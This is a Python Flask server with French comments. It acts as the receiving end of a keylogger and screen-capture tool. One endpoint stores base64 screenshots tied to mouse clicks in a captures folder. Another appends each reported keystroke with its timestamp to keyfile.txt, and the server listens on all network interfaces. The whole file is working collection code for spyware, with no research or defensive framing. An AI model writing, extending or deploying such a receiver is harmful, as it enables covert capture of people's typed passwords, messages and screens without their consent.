from flask import Flask, request, jsonify
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Créer le dossier 'captures' s'il n'existe pas
if not os.path.exists('captures'):
    os.makedirs('captures')

@app.route('/upload', methods=['POST'])
def upload_data():
    data = request.get_json()

    # Vérifier que les données sont bien reçues
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    # Extraire les informations de clic
    click_type = data.get('click_type')
    position = data.get('position')
    timestamp = data.get('timestamp')
    screenshot_data = data.get('screenshot')

    print(f"Réception d'un {click_type} à la position {position} à {timestamp}")

    # Si une capture d'écran est présente, la sauvegarder
    if screenshot_data:
        # Convertir l'image base64 en image et l'enregistrer
        screenshot = base64.b64decode(screenshot_data)
        timestamp_str = datetime.fromisoformat(timestamp).strftime('%Y%m%d_%H%M%S_%f')
        filename = f"captures/screenshot_{timestamp_str}.png"
        with open(filename, "wb") as f:
            f.write(screenshot)
        print(f"Capture d'écran enregistrée sous {filename}")

    return jsonify({"status": "success"}), 200

@app.route('/upload/key', methods=['POST'])
def upload_key():
    data = request.get_json()

    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    key = data.get('key')
    timestamp = data.get('timestamp')

    print(f"Réception d'une touche '{key}' à {timestamp}")

    # Enregistrer les touches dans un fichier
    with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
        logKey.write(f"{timestamp}: {key}\n")

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
